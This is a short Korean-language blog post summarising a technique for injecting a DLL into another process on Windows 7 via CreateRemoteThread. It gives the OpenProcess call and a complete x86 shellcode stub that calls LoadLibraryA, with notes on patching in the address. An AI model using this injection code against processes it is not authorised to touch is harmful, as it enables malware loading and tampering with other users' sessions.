---
layout: post
title: "CreateRemoteThread. Bypass Windows 7 Session Separation"
date: 2015-04-15 16:51:11 +0900
comments: true
categories: 
---

[CreateRemoteThread. Bypass Windows 7 Session Separation](http://syprog.blogspot.kr/2012/05/createremotethread-bypass-windows.html) 을 정리.

##### Opening the Victim Process

Target 에 어태치할때...

```
HANDLE WINAPI OpenProcess(
    DWORD dwDesiredAccess, /* PROCESS_ALL_ACCESS */
    BOOL bInheritHandle, /* FALSE */
    DWORD dwProcessID 
    );
```

#### Reading the Shellcode

``` 
use 32
    ; offset of the LoadLibraryA address within the shellcode
    dd func
    ; save all registers
    push eax ebx ecx edx ebp edi esi
    ; get your EIP
    call next
next:
    pop eax
    mov ebx, eax
    ; get the address of the DLL name
    mov eax, string - next
    ; do this to avoid possible negative values (due to sign extend)
    movzx eax, al
    add eax, ebx
    ; pass it to the LoadLibraryA API
    push eax
    ; get the address of the LoadLibraryA function
    mov eax, func - next
    movzx eax, al
    add eax, ebx
    mov eax, [eax]
    ; call LoadLibraryA
    call eax
    ; restore registers
    pop esi edi ebp edx ecx ebx eax
    ; return
    ret
func dd 0x12345678 ; placeholder for the address
string:
```

메모리에 shellcode 를 넣고, DLL path 를 strcat() 한다. 그리고, `LoadLibraryA()` 어드레스를 채워준다. 채워줄때는 쉘코드 첫 DD 를 참조하여 `func` 의 offset 을 계산한다. 이 작업을 해야 usable 한 shellcode 가 된다.
